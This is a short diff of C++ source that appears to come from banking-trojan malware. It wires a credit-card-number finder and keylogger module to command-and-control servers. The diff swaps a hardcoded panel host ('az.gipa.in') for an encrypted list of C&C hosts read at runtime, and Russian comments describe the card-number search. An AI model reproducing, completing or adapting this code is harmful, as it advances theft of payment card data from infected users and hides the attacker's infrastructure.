@@ -1,4 +1,14 @@
-#include "BotDebug.h"
+#include "GetApi.h"
+#include "KeyLogSystems.h"
+#include "Memory.h"
+#include "Utils.h"
+#include "Splice.h"
+#include "Config.h"
+#include "BotHTTP.h"
+#include "cc.h"
+
+
+//#include "BotDebug.h"
 
 namespace DBGCC
 {
@@ -7,7 +17,7 @@ namespace DBGCC
 
 #define CCDBG DBGCC::DBGOutMessage<>
 
-#define CCModule //говорим что модуль включен
+static char СС_HOSTS[CCHOSTS_PARAM_SIZE] = CCHOSTS_PARAM_NAME;
 
 //функция нахождения номера карточки, она определена в файле CreditCardNomber.cpp
 int FindCreditCard( char* pSrc, int szSrc, int fromSrc, char* pDst, int& posEnd );
@@ -92,7 +102,15 @@ const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";
 
 static char* GetAzUrl( char* url )
 {
+#ifdef DEBUGCONFIG
 	m_lstrcpy( url, panelaz );
+#else
+	string host = GetActiveHostFromBuf2( СС_HOSTS, 0xF9203A43 /* __CC_HOSTS__ */, ССHOSTS_PARAM_ENCRYPTED );
+	if( !host.IsEmpty() )
+		m_lstrcpy( url, host.t_str() );
+	else
+		url = 0;
+#endif
 	return url;
 }
 
